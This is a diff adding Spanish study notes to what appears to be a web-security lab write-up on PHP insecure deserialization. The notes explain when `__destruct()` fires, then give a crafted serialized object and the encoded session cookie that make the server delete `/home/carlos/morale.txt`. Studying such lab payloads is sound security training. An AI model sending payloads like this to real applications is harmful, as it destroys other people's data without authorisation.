@@ -45,3 +45,53 @@ class CustomTemplate {
 
 ?>
 ```
+
+
+### 🛠 ¿Qué es `__destruct()` en PHP?
+
+- `__destruct()` es un **método mágico** de PHP.
+    
+- Se llama **automáticamente** **cuando un objeto se destruye**.
+    
+
+¿Y **cuándo** PHP destruye un objeto?
+
+- Cuando se termina el script.
+    
+- Cuando haces `unset($obj)`.
+    
+- Cuando el objeto **ya no es referenciado por ninguna variable** (recolector de basura).
+    
+
+---
+
+### 🔥 En el caso de **deserialización**:
+
+Cuando haces:
+
+```php
+$obj = unserialize($data);
+```
+
+- PHP crea el objeto (`$obj`).
+    
+- Si después el objeto **sale de scope**, **o el script termina**, o lo haces `unset($obj)`, entonces PHP llama **automáticamente** al método `__destruct()` **del objeto**.
+    
+
+**NO necesitas llamarlo manualmente.**  
+**NO necesitas hacer nada especial.**
+
+PHP **garantiza** que, cuando el objeto ya no es usado, ejecuta su `__destruct()`.
+
+___
+
+Lo convertimos a base64 y luego url encode :
+```php
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+
+Cuando pase el garbage collector se eliminará el archivo :
+
+```HTTP
+Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
+```
